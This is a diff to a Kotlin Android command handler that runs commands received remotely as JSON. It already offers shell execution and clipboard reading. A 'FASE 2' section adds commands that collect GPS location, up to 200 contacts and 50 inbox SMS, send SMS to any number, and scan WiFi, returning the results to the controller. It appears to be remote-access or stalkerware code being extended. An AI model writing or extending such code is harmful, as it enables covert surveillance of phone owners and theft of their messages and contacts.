@@ -21,6 +21,14 @@ import java.io.InputStreamReader
 import android.content.ClipboardManager
 import android.content.ClipData
 import java.util.Locale
+import android.location.LocationManager
+import android.net.Uri
+import android.provider.ContactsContract
+import android.telephony.SmsManager
+import android.net.wifi.WifiManager
+import android.content.pm.PackageManager
+import androidx.core.content.ContextCompat
+import android.Manifest
 
 class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener {
 
@@ -37,6 +45,10 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
         }
     }
 
+    private fun checkPerm(perm: String): Boolean {
+        return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
+    }
+
     fun handle(jsonStr: String, sendResponse: (String) -> Unit) {
         var cmdId = ""
         try {
@@ -46,6 +58,7 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
             val textArg = json.optString("text", "")
 
             when (command) {
+                // ============== FASE 1 ==============
                 "ping" -> {
                     sendResponse(createResponse(cmdId, "pong", "Alive"))
                 }
@@ -77,13 +90,8 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         
                         val output = StringBuilder()
                         var line: String?
-                        while (reader.readLine().also { line = it } != null) {
-                            output.append(line).append("\n")
-                        }
-                        while (errorReader.readLine().also { line = it } != null) {
-                            output.append(line).append("\n")
-                        }
-                        
+                        while (reader.readLine().also { line = it } != null) output.append(line).append("\n")
+                        while (errorReader.readLine().also { line = it } != null) output.append(line).append("\n")
                         process.waitFor()
                         sendResponse(createResponse(cmdId, "shell_output", output.toString()))
                     } catch (e: Exception) {
@@ -102,7 +110,6 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     sendResponse(createResponse(cmdId, "volume_info", volInfo))
                 }
                 "set_volume" -> {
-                    // textArg format: "music 15" atau "ring 5"
                     val parts = textArg.split(" ")
                     if (parts.size >= 2) {
                         val type = parts[0]
@@ -127,14 +134,14 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         val cameraId = camManager.cameraIdList[0] 
                         val state = textArg.lowercase() == "on"
                         camManager.setTorchMode(cameraId, state)
-                        sendResponse(createResponse(cmdId, "success", "Torch turned $state"))
+                        sendResponse(createResponse(cmdId, "success", "Torch $state"))
                     } catch (e: Exception) {
-                        sendResponse(createResponse(cmdId, "error", "Torch failed: ${e.message}"))
+                        sendResponse(createResponse(cmdId, "error", "Torch err: ${e.message}"))
                     }
                 }
                 "tts" -> {
                     tts?.speak(textArg, TextToSpeech.QUEUE_ADD, null, null)
-                    sendResponse(createResponse(cmdId, "success", "Speaking: $textArg"))
+                    sendResponse(createResponse(cmdId, "success", "Speaking..."))
                 }
                 "notify" -> {
                     val parts = textArg.split("|")
@@ -169,7 +176,6 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                     sendResponse(createResponse(cmdId, "sensor_list", result))
                 }
                 "clipboard" -> {
-                    // Android 10+ mencegah akses clipboard background kecuali aplikasi di foreground
                     try {
                         val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                         if (cm.hasPrimaryClip() && cm.primaryClip != null && cm.primaryClip!!.itemCount > 0) {
@@ -182,12 +188,114 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                         sendResponse(createResponse(cmdId, "error", "Clipboard access blocked by OS: ${e.message}"))
                     }
                 }
+
+                // ============== FASE 2 ==============
+                "location" -> {
+                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) || checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                        val lm = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
+                        var loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
+                        if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
+                        
+                        if (loc != null) {
+                            val obj = JSONObject().apply {
+                                put("lat", loc.latitude)
+                                put("lon", loc.longitude)
+                                put("accuracy", loc.accuracy)
+                                put("google_maps", "https://maps.google.com/?q=${loc.latitude},${loc.longitude}")
+                            }
+                            sendResponse(createResponse(cmdId, "location_data", obj))
+                        } else {
+                            sendResponse(createResponse(cmdId, "error", "Location unavailable or GPS off"))
+                        }
+                    } else {
+                        sendResponse(createResponse(cmdId, "error", "Missing LOCATION permission"))
+                    }
+                }
+                "contacts" -> {
+                    if (checkPerm(Manifest.permission.READ_CONTACTS)) {
+                        val result = JSONArray()
+                        val cursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
+                        cursor?.let {
+                            var count = 0
+                            val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                            val numIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                            while (it.moveToNext() && count < 200) {
+                                val obj = JSONObject()
+                                obj.put("name", it.getString(nameIdx))
+                                obj.put("number", it.getString(numIdx))
+                                result.put(obj)
+                                count++
+                            }
+                            it.close()
+                        }
+                        sendResponse(createResponse(cmdId, "contacts_list", result))
+                    } else {
+                        sendResponse(createResponse(cmdId, "error", "Missing READ_CONTACTS permission"))
+                    }
+                }
+                "sms_list" -> {
+                    if (checkPerm(Manifest.permission.READ_SMS)) {
+                        val result = JSONArray()
+                        val cursor = context.contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")
+                        cursor?.let {
+                            var count = 0
+                            val addrIdx = it.getColumnIndex("address")
+                            val bodyIdx = it.getColumnIndex("body")
+                            val dateIdx = it.getColumnIndex("date")
+                            while (it.moveToNext() && count < 50) {
+                                val obj = JSONObject()
+                                obj.put("from", it.getString(addrIdx))
+                                obj.put("body", it.getString(bodyIdx))
+                                obj.put("date", it.getLong(dateIdx))
+                                result.put(obj)
+                                count++
+                            }
+                            it.close()
+                        }
+                        sendResponse(createResponse(cmdId, "sms_inbox", result))
+                    } else {
+                        sendResponse(createResponse(cmdId, "error", "Missing READ_SMS permission"))
+                    }
+                }
+                "sms_send" -> {
+                    if (checkPerm(Manifest.permission.SEND_SMS)) {
+                        val parts = textArg.split("|")
+                        if (parts.size >= 2) {
+                            val number = parts[0]
+                            val message = parts[1]
+                            SmsManager.getDefault().sendTextMessage(number, null, message, null, null)
+                            sendResponse(createResponse(cmdId, "success", "SMS Sent to $number"))
+                        } else {
+                            sendResponse(createResponse(cmdId, "error", "Format error. Use: [number]|[message]"))
+                        }
+                    } else {
+                        sendResponse(createResponse(cmdId, "error", "Missing SEND_SMS permission"))
+                    }
+                }
+                "wifi_scan" -> {
+                    if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) && checkPerm(Manifest.permission.ACCESS_WIFI_STATE)) {
+                        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
+                        wm.startScan()
+                        val results = wm.scanResults
+                        val arr = JSONArray()
+                        for (res in results) {
+                            val obj = JSONObject()
+                            obj.put("ssid", res.SSID)
+                            obj.put("bssid", res.BSSID)
+                            obj.put("level", res.level)
+                            arr.put(obj)
+                        }
+                        sendResponse(createResponse(cmdId, "wifi_networks", arr))
+                    } else {
+                        sendResponse(createResponse(cmdId, "error", "Missing WIFI/LOC permissions"))
+                    }
+                }
                 else -> {
                     sendResponse(createResponse(cmdId, "error", "Unknown command: $command"))
                 }
             }
         } catch (e: Exception) {
-            sendResponse(createResponse(cmdId, "error", e.message ?: "Invalid JSON or Logic"))
+            sendResponse(createResponse(cmdId, "error", e.message ?: "Logic Error"))
         }
     }
 
